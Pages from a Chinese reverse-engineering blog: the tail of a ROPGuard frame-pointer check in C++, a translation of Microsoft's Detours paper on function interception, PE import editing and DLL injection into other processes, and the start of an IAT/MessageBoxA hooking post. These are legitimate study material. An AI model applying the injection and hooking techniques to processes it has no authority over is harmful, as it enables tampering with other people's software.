class="line">            ReportPossibleROP(errorreport.str());</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(((<span class="keyword">unsigned</span> <span class="keyword">long</span>)newFramePtr &lt; stackBottom) ||</span><br><span class="line">           ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)newFramePtr &gt; stackTop))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">stringstream</span> errorreport;</span><br><span class="line">            errorreport &lt;&lt; <span class="string">"Frame pointer is outside of stack."</span>;</span><br><span class="line">            errorreport &lt;&lt; <span class="string">" Frame pointer: "</span>;</span><br><span class="line">            errorreport &lt;&lt; <span class="built_in">std</span>::hex &lt;&lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>)framePtr;</span><br><span class="line">            errorreport &lt;&lt; <span class="string">" Original frame pointer: "</span>;</span><br><span class="line">            errorreport &lt;&lt; <span class="built_in">std</span>::hex &lt;&lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>)</span><br><span class="line">originalFramePtr;</span><br><span class="line">            ReportPossibleROP(errorreport.str());</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>((<span class="keyword">unsigned</span> <span class="keyword">long</span>)newFramePtr &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)framePtr)&#123;</span><br><span class="line">            <span class="built_in">stringstream</span> errorreport;</span><br><span class="line">            errorreport &lt;&lt; <span class="string">"Next frame pointer is not "</span>;</span><br><span class="line">            errorreport &lt;&lt; <span class="string">"below the previous one on stack."</span>;</span><br><span class="line">            errorreport &lt;&lt; <span class="string">" Frame pointer: "</span>;</span><br><span class="line">            errorreport &lt;&lt; <span class="built_in">std</span>::hex &lt;&lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>)framePtr;</span><br><span class="line">            errorreport &lt;&lt; <span class="string">" Original frame pointer: "</span>;</span><br><span class="line">            errorreport &lt;&lt; <span class="built_in">std</span>::hex &lt;&lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>)</span><br><span class="line">originalFramePtr;</span><br><span class="line">    ReportPossibleROP(errorreport.str());</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    framePtr = newFramePtr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>源文件+论文，链接: <a href="https://pan.baidu.com/s/1INd_yvOU_CWzG6rDt-TlLw" target="_blank" rel="noopener">https://pan.baidu.com/s/1INd_yvOU_CWzG6rDt-TlLw</a> 密码: tp9w</p>

      

      
    </div>
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<i class="icon-price-tags icon"></i>
		<ul class="article-tag-list">
			 
        		<li class="article-tag-list-item">
        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">reverse</a>
        		</li>
      		
		</ul>
	</div>

      

      
        <p class="article-more-link">
          <a class="article-more-a" href="/2018/07/07/ROPGuard/">展开全文 >></a>
        </p>
      

      
      <div class="clearfix"></div>
    </div>
  </div>
</article>

<aside class="wrap-side-operation">
    <div class="mod-side-operation">
        
        <div class="jump-container" id="js-jump-container" style="display:none;">
            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
                <i class="icon-font icon-back"></i>
            </a>
            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
                <i class="icon-font icon-plane jump-plane"></i>
            </div>
        </div>
        
        
    </div>
</aside>




  
    <article id="post-Detours" class="article article-type-post  article-index" itemscope itemprop="blogPost">
  <div class="article-inner">
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/07/07/Detours/">Detours</a>
    </h1>
  

        
        <a href="/2018/07/07/Detours/" class="archive-article-date">
  	<time datetime="2018-07-07T03:34:51.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-07-07</time>
</a>
        
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="1-Detours"><a href="#1-Detours" class="headerlink" title="1.Detours"></a>1.Detours</h1><p>因为有一篇Detours最简单的API钩子的文章，微软研究院的，全英文，英语差的我，就捉摸着翻译看一看。</p>
<p><a href="https://github.com/microsoft/detours" target="_blank" rel="noopener">https://github.com/microsoft/detours</a></p>
<p><a href="http://research.microsoft.com/pubs/68568/huntusenixnt99.pdf" target="_blank" rel="noopener">http://research.microsoft.com/pubs/68568/huntusenixnt99.pdf</a></p>
<p>文章蛮老了，好多年前了，但是很经典。 翻译文章大部分采取google的～反正我就将就着看看。</p>
<p>正文：</p>
<p>Detours：Win32函数的二进制截取<br>Galen Hunt和Doug Brubacher<br>微软研究院</p>
<h2 id="概要："><a href="#概要：" class="headerlink" title="概要："></a>概要：</h2><p>​    创新系统研究取决于能否轻松检测和扩展现有操作系统和应用程序功能。通过访问适当的源代码，通过重建OS或应用程序来插入新的工具或扩展通常是微不足道的。然而，在当今的商业软件世界中，研究人员很少能够访问所有相关的源代码。<br>    我们提供了Detours，一个用于在x86机器上检测任意Win32函数的库。 Detours通过重写目标函数图像来拦截Win32函数。 Detours包还包含将任意DLL和数据段（称为有效负载）附加到任何Win32二进制文件的实用程序。<br>    虽然先前的研究人员已经使用二进制重写来插入调试和分析仪器，但据我们所知，Detours是任何平台上的第一个逻辑上保存未检测的目标函数（可通过Trampoline调用）作为仪器使用的子程序的软件包。我们独特的Trampoline设计对于扩展现有的二进制软件至关重要。<br>    我们描述了使用Detours创建自动分布式分区系统，检测和分析DCOM协议栈以及为基于COM的OS API创建thunking层的经验。微基准测试证明了Detours库的效率。</p>
<h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h2><p>​    创新的系统研究取决于能否轻松地检测和扩展现有的操作系统和应用程序功能，无论是在应用程序，库还是操作系统DLL中。拦截函数的典型原因是添加功能，修改返回的结果或插入用于调试或分析的工具。通过访问适当的源代码，通过重建OS或应用程序来插入新的工具或扩展通常是微不足道的。然而，在当今的商业开发和仅二进制版本的世界中，研究人员很少能够访问所有相关的源代码。<br>    Detours是一个用于在x86机器上拦截任意Win32二进制函数的库。拦截代码在运行时动态应用。 Detours使用无条件跳转到用户提供的绕行功能替换目标函数的前几条指令。来自目标函数的指令保存在Trampoline函数中。 trampoline函数包括从目标函数中删除的指令和到目标函数其余部分的无条件分支。绕行函数可以通过调用目标函数作为通过Trampoline的子程序来替换目标函数或扩展其语义。<br>    在执行时插入Detours。 目标函数的代码在内存中而不是在磁盘上进行修改，从而便于以非常精细的粒度拦截二进制函数。 例如，DLL中的过程可以在同时运行的一个执行中绕行。 与DLL重新链接或静态重定向不同，Detours库中使用的拦截技术无论应用程序或系统代码使用何种方法来定位目标函数，都可以保证工作。<br>    虽然其他人使用二进制重写进行调试和内联仪器，但Detours是一个通用的软件包。 据我们所知，Detours是任何平台上的第一个包，可以将未装备的目标函数逻辑保存为可通过Trampoline（trampoline）调用的子程序。 先前的系统在逻辑上将仪器预先添加到目标，但是没有使原始目标的功能可用作一般子程序。 我们独特的Trampoline设计对于扩展现有的二进制软件至关重要。<br>    除了基本的绕行功能外，Detours还包括编辑任何二进制文件的DLL导入表，将任意数据段附加到现有二进制文件以及将DLL注入新进程或现有进程的函数。 一旦注入到进程中，检测DLL就可以绕过任何Win32函数，无论是在应用程序还是系统库中。<br>    以下部分描述了Detours的工作原理。 第0节概述了Detours库的用法。 第4节描述了替代功能拦截技术，并提出了Detours的微基准评估。 第5节详细介绍了Detours用于从本地应用程序生成分布式应用程序，量化DCOM开销，为新的基于COM的Win32 API创建thunking层以及实现第一次机会异常处理的用法。 我们将Detours与第6节中的相关工作进行了比较，并总结了我们在第7节中的贡献。</p>
<h2 id="2-实施"><a href="#2-实施" class="headerlink" title="2.实施"></a>2.实施</h2><p>​    Detours提供三组重要的功能：能够拦截x86机器上的任意Win32二进制函数，编辑二进制文件的导入表的能力，以及将任意数据段附加到二进制文件的能力。 我们将描述每个功能的实现。</p>
<h3 id="2-1-拦截二进制函数"><a href="#2-1-拦截二进制函数" class="headerlink" title="2.1.拦截二进制函数"></a>2.1.拦截二进制函数</h3><p>​    Detours库有助于拦截函数调用。拦截代码在运行时动态应用。 Detours使用无条件跳转到用户提供的绕行功能替换目标函数的前几条指令。来自目标函数的指令保存在trampoline函数中。trampoline包括从目标函数中删除的指令和到目标函数其余部分的无条件分支。<br>    当执行到达目标函数时，控制直接跳转到用户提供的绕行函数。绕行功能执行适当的拦截预处理。绕行函数可以将控制权返回给源函数，也可以调用trampoline函数，该函数调用目标函数而不进行拦截。当目标函数完成时，它将控制返回到绕行函数。绕行功能执行适当的后处理并将控制返回到源功能。图1显示了有和没有拦截的函数调用的逻辑控制流程。</p>
<p><img src="/2018/07/07/Detours/1.png" alt="1"></p>
<p>​    Detours库通过重写其进程内二进制图像来拦截目标函数。 对于每个目标函数，Detours实际重写两个函数：目标函数和匹配的trampoline函数。 trampoline功能可以动态或静态分配。 静态分配的trampoline总是在没有绕行的情况下调用目标函数。 在插入绕行之前，静态trampoline包含到目标的单个跳跃。 插入后，trampoline包含来自目标函数的初始指令并跳转到目标函数的其余部分。</p>
<p>​    静态分配的trampoline对于仪器程序员非常有用。 例如，在Coign [7]中，调用Coign_Co- CreateInstance trampoline相当于在没有检测的情况下调用原始CoCreateInstance函数。 Coign内部函数可以随时调用Count_CoCreate- Instance来创建新的组件实例，而无需考虑原始函数是否已通过绕行重新路由。</p>
<p><img src="/2018/07/07/Detours/2.png" alt="2"></p>
<p>​    图2显示了绕道的插入。为了绕过目标函数，Detours首先为动态trampoline函数分配内存（如果没有提供静态trampoline），然后启用对目标和trampoline的写访问。从第一条指令开始，Detours将指令从目标复制到trampoline，直到至少复制了5个字节（足以进行无条件跳转指令）。如果目标函数少于5个字节，Detours将中止并返回错误代码。要复制说明，Detours使用简单的表驱动反汇编程序。 Detours在trampoline末尾添加一条跳转指令到目标函数的第一个非复制指令。 Detours将无条件跳转指令写入detour函数作为目标函数的第一条指令。要完成，Detours将恢复目标和trampoline函数的原始页面权限，并通过调用Flush-InstructionCache刷新CPU指令缓存。</p>
<h3 id="2-2-有效载荷和DLL导入编辑"><a href="#2-2-有效载荷和DLL导入编辑" class="headerlink" title="2.2.有效载荷和DLL导入编辑"></a>2.2.有效载荷和DLL导入编辑</h3><p>​    虽然存在许多用于编辑二进制文件的工具，但大多数系统研究并不需要对二进制文件进行如此严厉的访问。相反，将额外的DLL或数据段添加到应用程序或系统二进制文件通常就足够了。除了绕行函数之外，Detours库还包含完全可逆的支持，用于将任意数据段（称为有效负载）附加到Win32二进制文件以及编辑DLL导入表。<br>        图3显示了Win32可移植可执行（PE）二进制文件的基本结构。 Win32二进制文件的PE格式是COFF（公共对象文件格式）的扩展。 Win32二进制文件包括DOS兼容标头，PE标头，包含程序代码的文本部分，包含初始化数据的数据部分，列出任何导入的DLLS和函数的导入表，列出代码导出的函数的导出表以及调试符号。除了两个标头之外，文件的每个其他部分都是可选的，并且可能不存在于给定的二进制文件中。</p>
<p><img src="/2018/07/07/Detours/3.png" alt="3"></p>
<p>​    要修改Win32二进制文件，Detours会在导出表和调试符号之间创建一个新的.detours部分。请注意，调试符号必须始终位于Win32二进制文件的最后。新部分包含detours标头记录和原始PE标头的副本。如果修改导入表，Detours会创建新的导入表，将其附加到复制的PE头，然后修改原始PE头以指向新的导入表。最后，Detours在.detours部分的末尾写入任何用户有效负载，并附加调试符号以完成文件。 Detours可以通过从.detours部分恢复原始PE头并删除.detours部分来反转对Win32二进制文件的修改。图4显示了Detours修改的Win32二进制文件的格式。<br>    创建新的导入表有两个目的。首先，它保留原始导入表，以防程序员需要反转对Win32文件的所有修改。其次，新的导入表可以包含重命名的导入DLL和函数，也可以包含全新的DLL和函数。例如，Coign [7]使用Detours将coignrte.dll的初始条目插入到每个已检测的应用程序中。作为应用程序导入表中的第一个条目，coignrte.dll始终是在应用程序的地址空间中运行的第一个DLL。</p>
<p><img src="/2018/07/07/Detours/4.png" alt="4"></p>
<p>​    Detours提供了编辑导入表，添加有效负载，枚举有效负载，删除有效负载以及重新绑定二进制文件的功能。 Detours还提供了枚举映射到地址空间的二进制文件以及在这些映射的二进制文件中定位有效负载的例程。 每个有效负载由128位全局唯一标识符（GUID）标识。 Coign使用Detours将每个应用程序配置数据附加到应用程序二进制文件。<br>    如果需要在不修改二进制文件的情况下将检测插入应用程序，Detours提供了将DLL注入新进程或现有进程的功能。 为了注入DLL，Detours使用Virtual-AllocEx和WriteProcessMemory API将LoadLibrary调用写入目标进程，然后使用CreateRemote-Thread API调用该调用。（ps：CreateRemote-Thread 可在其他进程中创建线程）</p>
<h2 id="3-使用Detours"><a href="#3-使用Detours" class="headerlink" title="3.使用Detours"></a>3.使用Detours</h2><p>​    图5中的代码片段说明了Detours库的用法。 用户代码必须包含detours.h头文件并与detours.lib库链接。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;detours.h&gt;</span></span></span><br><span class="line">VOID (*DynamicTrampoline)(VOID) = <span class="literal">NULL</span>;</span><br><span class="line">DETOUR_TRAMPOLINE(</span><br><span class="line"> VOID WINAPI SleepTrampoline(DWORD),</span><br><span class="line"> Sleep</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="function">VOID WINAPI <span class="title">SleepDetour</span><span class="params">(DWORD dw)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="keyword">return</span> SleepTrampoline(dw);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">VOID <span class="title">DynamicDetour</span><span class="params">(VOID)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="keyword">return</span> DynamicTrampoline();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> VOID (*DynamicTarget)(VOID) = SomeFunction;</span><br><span class="line"> DynamicTrampoline</span><br><span class="line"> =(FUNCPTR)DetourFunction(</span><br><span class="line"> (PBYTE)DynamicTarget,</span><br><span class="line"> (PBYTE)DynamicDetour);</span><br><span class="line"></span><br><span class="line"> DetourFunctionWithTrampoline(</span><br><span class="line"> (PBYTE)SleepTrampoline,</span><br><span class="line"> (PBYTE)SleepDetour);</span><br><span class="line"></span><br><span class="line"> <span class="comment">// Execute the remainder of program.</span></span><br><span class="line"> DetourRemoveTrampoline(SleepTrampoline);</span><br><span class="line"> DetourRemoveTrampoline(DynamicTrampoline);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Figure 5. Sample Instrumentation Program.</span></span><br></pre></td></tr></table></figure>
<p>​    可以静态地或动态地创建trampoline。要使用静态trampoline拦截目标函数，应用程序必须使用DETOUR_TRAMPOLINE宏创建trampoline。 DETOUR_TRAMPOLINE有两个参数：静态trampoline的原型和目标函数的名称。<br>    请注意，为了正确拦截，原型，目标，trampoline和绕行函数必须具有完全相同的调用签名，包括参数数量和调用约定。绕行函数在通过trampoline调用目标函数时复制参数是责任。这很直观，因为目标函数只是一个可由绕行函数调用的子程序。<br>    使用相同的调用约定可确保正确保留寄存器，并且堆栈将在绕行和目标函数之间正确对齐。<br>    通过使用两个参数调用DetourFunctionWith- Trampoline函数来启用目标函数的拦截：trampoline和指向detour函数的指针。目标函数不作为参数给出，因为它已经在trampoline中编码。<br>    通过使用两个参数调用DetourFunction来创建动态trampoline：指向目标函数的指针和指向detour函数的指针。 DetourFunction分配一个新的trampoline并在目标函数中插入适当的拦截代码。<br>    当目标函数作为链接符号可用时，静态trampoline非常容易使用。当目标函数不可用于链接时，可以使用动态trampoline。通常，可以从第二功能获取到目标功能的功能指针。对于那些时候，当指向目标函数的指针不容易获得时，DetourFindFunction可以在从已知DLL导出函数时找到指向函数的指针，或者如果调试符号可用于目标函数的二进制函数。<br>    DetourFindFunction接受两个参数，二进制文件的名称和函数的名称。 DetourFindFunction返回指向函数的有效指针，如果找不到函数的符号，则返回NULL。 DetourFindFunction首先尝试使用Win32 LoadLibrary和GetProcAddress API来定位函数。如果在DLL的导出表中找不到该函数，则Detour- FindFunction使用ImageHlp库来搜索可用的调试符号。 DetourFind- Function返回的函数指针可以给DetourFunction创建动态trampoline。<br>    可以通过调用DetourRemove-Trampoline函数来删除目标函数的拦截。<br>    注意，因为Detours中的功能库修改应用程序地址空间中的代码，程序员有责任确保在插入或删除绕行时没有其他线程在地址空间中执行。确保单线程执行的简单方法是从DllMain例程调用Detours库中的函数。</p>
<h2 id="4-评估"><a href="#4-评估" class="headerlink" title="4.评估"></a>4.评估</h2><p>存在几种用于拦截函数调用的替代技术。</p>
<p>替代拦截技术包括：<br>​    <strong>在应用程序源代码中调用替换</strong>。通过修改应用程序源代码，调用目标函数将替换为对detour函数的调用。这种技术的主要缺点是它需要访问源代码。<br>​    <strong>应用二进制代码中的呼叫替换</strong>。通过修改应用程序二进制文件，调用目标函数将替换为对detour函数的调用。虽然此技术不需要源代码，但应用程序二进制文件中的替换确实需要能够识别所有适用的呼叫站点。这需要大量的符号信息，这些信息通常不适用于二进制软件。<br>​    <strong>DLL重定向</strong>。如果目标函数驻留在DLL中，则可以修改二进制文件中的DLL导入条目以指向绕行DLL。重定向到绕行DLL可以通过在加载时替换导入表中的原始DLL的名称或者在加载[2]之后替换间接导入跳转表中的函数地址来实现。不幸的是，通过导入表重定向到绕行DLL无法在应用程序执行的早期拦截DLL内部调用和对LoadLibrary和GetProcAddress API获取的指针的调用。<br>​    <strong>断点陷阱</strong>。可以通过将调试断点插入目标函数来拦截目标函数，而不是替换DLL。然后，调试异常处理程序可以调用绕行函数。断点捕获的主要缺点是调试异常会挂起所有应用程序线程。此外，必须在第二个操作系统进程中捕获调试异常。通过断点捕获进行的拦截具有很高的性能损失。</p>
<p>​    表1列出了拦截空函数或CoCreateInstance API的时间。 时间在200 MHz Pentium Pro上。 行列出了在没有拦截的情况下调用函数的时间，通过调用替换进行拦截，通过DLL重定向进行拦截，使用Detours库进行拦截，或通过断点捕获进行拦截。 可以看出，使用Detours库进行的函数拦截只有很小的开销（在任何一种情况下都小于400 ns）。</p>
<p><img src="/2018/07/07/Detours/5.png" alt="5"></p>
<h2 id="5-经验"><a href="#5-经验" class="headerlink" title="5.经验"></a>5.经验</h2><p>​    在过去两年中，Detours软件包已在Microsoft Research中广泛使用，用于检测和扩展Win32应用程序和Windows NT操作系统。<br>​    Detours最初是为Coign自动分布式分区系统[7]开发的。 Coign将从COM组件构建的本地桌面应用程序转换为分布式客户端 - 服在分析期间，Coign使用Detours拦截对COM实例化函数（如CoCreateInstance）的调用。绕行函数通过trampolines调用原始库函数，然后将输出接口指针包装在另外的检测层中（有关详细信息，请参阅[8]）。检测层测量组件间通信，以确定应如何跨网络分区应用程序组件。在分布式执行期间，新的Coign绕行函数拦截对COM实例化函数的调用，并将这些调用重新路由到分布式计算机。实质上，Coign扩展了COM库以支持智能远程用。 DCOM支持远程调用几个COM实例化函数，而Coign通过绕行扩展支持大约50个COM函数的远程调用。 Coign使用Detours的DLL重定向函数来附加运行时加载器和有效负载函数，以将分析数据附加到应用程序二进制文件。 </p>
<p>​    我们的同事使用Detours来检测DCOM协议栈的用户模式部分，包括编组代理，DCOM运行时，RPC运行时，WinSock运行时和编组存根[11]。然后使用得到的详细分析来驱动用于快速用户模式网络的DCOM的重新架构。虽然他们可以使用源代码修改来生成DCOM的特殊分析版本，但基于源的检测将依赖于版本并由分析机器上的所有DCOM应用程序共享。使用基于Detours的二进制检测，可以将分析工具附加到DCOM的任何Windows NT 4版本，并仅影响正在分析的进程。</p>
<p>​    在另一个扩展练习中，Detours用于为COP（基于组件的操作系统代理）创建一个thunking层[14]。 COP是基于COM的Win32 API版本。 COP感知应用程序通过COM接口访问操作系统功能，例如IWin32FileHandle。由于COP接口可与DCOM一起分发，因此COP应用程序可以从网络中的任何机器使用OS资源，包括文件系统，键盘，鼠标，显示器，注册表等。为了支持遗留应用程序，COP使用绕行函数拦截对Win32 API的所有应用程序调用。本机应用程序API调用将转换为COP接口上的调用。在底部，COP实现通过trampoline功能与底层操作系统通信。 COP不需要修改应用程序二进制文件。在加载时，COP DLL通过Detours的注入功能注入应用程序的地址空间。通过简单的拦截，Detours促进了Win32 API的大规模扩展。 </p>
<p>​    最后，为了支持软件分布式共享内存（SDSM）系统，我们为Win32结构化异常处理实现了第一次机会异常过器。 Win32 API包含一个API，SetUnhandledException-Filter，如果没有其他过滤器处理应用程序异常，应用程序可以通过该API指定要执行的异常过滤器。对于诸如SDSM系统的应用程序，程序员希望插入第一次机会异常过滤器以消除由SDSM操纵VM页面权限引起的页面误。 Windows NT不提供这种第一次机会异常过滤机制。简单的绕行程序拦截从内核模式到用户模式的异常入口点（KiUser- ExceptionDispatcher）。只有几行代码，detour函数调用用户提供的第一次机会异常过滤器，然后通过trampoline将异常（如果未处理）转发到默认异常机制。</p>
<h2 id="6-相关工作"><a href="#6-相关工作" class="headerlink" title="6.相关工作"></a>6.相关工作</h2><p>​    Detours是代码修补的一般技术的扩展。为了拦截执行，在目标函数中将无条件分支或跳转插入到期望的拦截点。由无条件分支覆盖的代码被移动到代码补丁。代码补丁包括检测代码或对检测代码的调用，后跟移动以插入无条件分支的指令以及在无条件分支之后跳转到目标函数中的第一条指令。从逻辑上讲，代码补丁可以预先添加到a的开头函数，插入函数中的某个任意点，或附加到函数的末尾。<br>​    然后代码补丁调用检测然后继续目标函数，我们的技术将控制完全转移到绕行功能，该功能可以通过trampoline休闲地调用原始目标功能。trampoline使仪器完全自由地随时调用原始函数的语义作为可调用子程序。<br>​    自数字计算出现以来，代码修补技术已经存在。代码修补已应用于插入调试或分析代码。在遥远的过去，代码修补通常被认为是比重新编译整个应用程序更实用的更新方法。除了调试和分析之外，Detours还被用于资源扩展现有系统的功能。<br>​    虽然最近的系统已经将代码修补扩展到并行应用程序[1]和系统内核[16]，但据我们所知，Detours是唯一的代码修补系统，它将目标函数的语义保留为可调用的子例程。绕行功能取代了目标功能，但可以通过trampoline随时调用其功能。我们独特的trampoline设计使得扩展现有二进制功能的功能变得微不足道。<br>​    最近的研究产生了一类详细的二进制重写工具，包括Atom [13]，Etch [12]，EEL [10]和Morph [17]。通常，这些工具将应用程序二进制文件和检测脚本作为输入。检测脚本在指令，基本块或函数之间传递二进制插入代码。脚本的输出是一个新的，检测的二进制文件。对于早期系统而言，DyninstAPI [6]可以动态修改应用程序。<br>​    Detours比详细的二进制重写器的主要优势在于它的大小。 Detours为一个仪器包增加了不到18KB，而详细的二进制重写器至少增加了几百KB。 Detours小尺寸的成本是无法在指令或基本块之间插入代码。详细的二进制重写器可以通过诸如自由寄存器发现之类的复杂功能在任何指令周围插入检测。 Detours依赖于遵守调用约定以保留寄存器值。虽然详细的二进制重写器支持在任何基本指令单元之前或之后插入代码，但它们不会将未经检测的目标函数的语义保留为可调用的子例程。</p>
<h2 id="7-结论"><a href="#7-结论" class="headerlink" title="7.结论"></a>7.结论</h2><p>​    Detours库为系统研究人员提供了一套导入工具。绕行功能快速，灵活，友好。绕过CoCreateInstance函数的开销小于3％，这比断点捕获的惩罚小一个数量级。 Detours图书馆非常小。运行时由少于40KB的编译代码组成，尽管通常少于18KB的代码被添加到用户检测中。<br>​    我们目前正在开发用于Windows 98和Alpha处理器的Detours版本。由于Alpha RISC架构中指令的统一大小，Alpha端口应该是微不足道的。<br>​    与DLL重定向不同，Detours库拦截静态和动态绑定的调用。最后，Detours库比DLL重定向或应用程序代码修改更灵活。可以在执行时单独为每个进程选择性地启用或禁用任何功能的拦截。<br>​    我们独特的trampoline保留了原始的未经仪器化的目标函数的语义，可用作绕行函数的子程序。使用绕行函数和trampoline，在不访问系统源代码且不重新编译底层二进制文件的情况下生成引人注目的系统扩展是微不足道的。 Detours使得在Windows NT平台上进行全新一代创新系统研究成为可能。</p>

      

      
    </div>
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<i class="icon-price-tags icon"></i>
		<ul class="article-tag-list">
			 
        		<li class="article-tag-list-item">
        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">reverse</a>
        		</li>
      		
		</ul>
	</div>

      

      
        <p class="article-more-link">
          <a class="article-more-a" href="/2018/07/07/Detours/">展开全文 >></a>
        </p>
      

      
      <div class="clearfix"></div>
    </div>
  </div>
</article>

<aside class="wrap-side-operation">
    <div class="mod-side-operation">
        
        <div class="jump-container" id="js-jump-container" style="display:none;">
            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
                <i class="icon-font icon-back"></i>
            </a>
            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
                <i class="icon-font icon-plane jump-plane"></i>
            </div>
        </div>
        
        
    </div>
</aside>




  
    <article id="post-API钩子" class="article article-type-post  article-index" itemscope itemprop="blogPost">
  <div class="article-inner">
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/07/06/API钩子/">API钩子</a>
    </h1>
  

        
        <a href="/2018/07/06/API钩子/" class="archive-article-date">
  	<time datetime="2018-07-06T12:25:06.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-07-06</time>
</a>
        
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="1-API钩子类型"><a href="#1-API钩子类型" class="headerlink" title="1. API钩子类型"></a>1. API钩子类型</h1><p>改写目标函数开头几个字节<br>改写 IAT（Import Address Table，导入地址表）</p>
<p>IAT型钩子 在爱甲健二的书中，有推荐Advanced Windows，里面有详细的介绍。</p>
<p>（IAT即Import Address Table 是PE（可以理解为EXE）的输入地址表，我们知道一个程序运行时可以要调用多个模块，或者说要调用许多API函数，但这些函数不一定都在EXE本身中，例如你调用Messagebox来显示一个对话框时，你只需要调用它，你并没有编写Messagebox的函数的实现过程，Messagebox的函数的实现过程实际上是在user32.dll这个库文件中，当这个程序运行时会在user32.dll中找到Messagebox并调用它。</p>
<p>IMAGE_THUNK_DATA指向 IMAGE_IMPORT_BY_NAME 结构的RVA，OriginalFirstThunk 和 FirstThunk 所指向的这两个数组大小取决于PE文件从DLL中引入函数的数目。当PE文件被装载到内存时，PE装载器将查找IMAGE_THUNK_DATA 和 IMAGE_IMPORT_BY_NAME 这些结构数组，以此决定引入函数的地址。然后用引入函数真实地址来替代由FirstThunk指向的 IMAGE_THUNK_DATA 数组里的元素值。</p>
<p>所以IAT Hook的原理就是把后面的目标函数的地址改成我们自己写的函数的地址。这样，当在此调用目标函数的时候，就会调用我们的函数的地址。）<a href="http://blog.nsfocus.net/sample-analysis-manual-theory/#69_IAT_Hook。" target="_blank" rel="noopener">http://blog.nsfocus.net/sample-analysis-manual-theory/#69_IAT_Hook。</a></p>
<h1 id="2-Detours"><a href="#2-Detours" class="headerlink" title="2. Detours"></a>2. Detours</h1><p>从0开始编写一个API钩子，那是不存在的。可以使用微软研究院的Detours的API钩子库来尝试实现一个简单的API钩子。</p>
<p><a href="https://github.com/microsoft/detours" target="_blank" rel="noopener">https://github.com/microsoft/detours</a></p>
<p><a href="http://research.microsoft.com/en-us/projects/detours" target="_blank" rel="noopener">http://research.microsoft.com/en-us/projects/detours</a></p>
<p><a href="http://research.microsoft.com/pubs/68568/huntusenixnt99.pdf" target="_blank" rel="noopener">http://research.microsoft.com/pubs/68568/huntusenixnt99.pdf</a></p>
<p>只要我们知道DLL所导出的函数，就可以在运行时对该函数的调用进行劫持。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//detourshook.h</span></span><br><span class="line"><span class="comment">//将user32.dll导出的函数MessageBoxA替换成HookedMessageBoxA。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DETOURSHOOK_EXPORTS</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DETOURSHOOK_API __declspec(dllexport)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DETOURSHOOK_API __declspec(dllimport)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">DETOURSHOOK_API <span class="keyword">int</span> WINAPI <span class="title">HookedMessageBoxA</span><span class="params">(HWND hWnd,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPCTSTR lpText, LPCTSTR lpCaption, UINT uType)</span></span>;</span><br></pre></td></tr></table></figure>
